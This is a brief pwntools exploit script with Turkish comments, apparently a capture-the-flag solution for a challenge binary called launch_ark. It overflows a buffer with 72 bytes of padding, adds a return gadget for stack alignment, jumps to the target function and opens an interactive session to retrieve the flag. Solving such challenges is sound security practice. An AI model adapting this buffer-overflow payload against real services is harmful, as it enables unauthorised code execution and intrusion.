from pwn import *

# Hedef sunucu bilgisi
HOST = 'localhost' # veya uzak sunucu IP'si
PORT = 9005

elf = ELF('./challenges/signal-05-pwn/launch_ark')
target_func = elf.symbols['launch_ark']
ret_gadget = target_func + 1 # Stack 16-byte alignment

offset = 72
payload = b"A" * offset + p64(ret_gadget) + p64(target_func)

# Uzak servise bağlan
io = remote(HOST, PORT)
io.recvuntil(b"[?] ATESLEME KONTROL PROTOKOLUNU GIRIN: ")
io.sendline(payload)

# Flag'i al
io.interactive()